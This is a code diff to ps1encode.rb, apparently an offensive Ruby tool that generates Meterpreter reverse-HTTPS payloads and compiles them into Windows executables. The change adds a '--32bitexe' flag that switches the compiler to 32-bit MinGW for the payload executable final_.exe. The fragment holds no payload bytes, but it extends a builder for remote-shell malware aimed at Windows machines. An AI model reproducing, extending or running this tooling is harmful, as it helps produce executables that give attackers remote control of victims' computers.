@@ -38,13 +38,14 @@ options = {}
 
 optparse = OptionParser.new do|opts|
 
-    opts.banner = "Usage: ps1encode.rb --LHOST [default = 127.0.0.1] --LPORT [default = 443] --PAYLOAD [default = windows/meterpreter/reverse_https] --ENCODE [default = cmd]"
+    opts.banner = "Usage: ps1encode.rb --LHOST [default = 127.0.0.1] --LPORT [default = 443] --PAYLOAD [default = windows/meterpreter/reverse_https] --ENCODE [default = cmd] --32bitexe"
     opts.separator ""
     
     options[:LHOST] = "127.0.0.1"
     options[:LPORT] = "443"
     options[:PAYLOAD] = "windows/meterpreter/reverse_https"
     options[:ENCODE] = "cmd"
+    options[:ARCH] = "64"
 
     opts.on('-i', '--LHOST VALUE', "Local host IP address") do |i|
         options[:LHOST] = i
@@ -54,6 +55,10 @@ optparse = OptionParser.new do|opts|
                 options[:LPORT] = p
         end
     
+    opts.on('--32bitexe', "Force 32 bit EXE") do |z|
+                options[:ARCH] = "32"
+        end
+
     opts.on('-a', '--PAYLOAD VALUE', "Payload to use") do |a|
                 options[:PAYLOAD] = a
         end
@@ -75,6 +80,7 @@ $lhost = options[:LHOST]
 $lport = options[:LPORT]
 $lpayload = options[:PAYLOAD]
 $lencode = options[:ENCODE]
+$exe_arch = options[:ARCH]
 
 #string byte to hex
 class String
@@ -292,7 +298,11 @@ c_file_temp.close
 #compiling will require MinGW installed - "apt-get install mingw32"
 puts "compiling..."
 
-system("x86_64-w64-mingw32-gcc c_file_temp.c -o final_.exe")
+if $exe_arch == "32"
+    system("i686-w64-mingw32-gcc c_file_temp.c -o final_.exe")
+else 
+    system("x86_64-w64-mingw32-gcc c_file_temp.c -o final_.exe")
+end
 system("rm c_file_temp.c")
 
 puts "final_.exe created!"
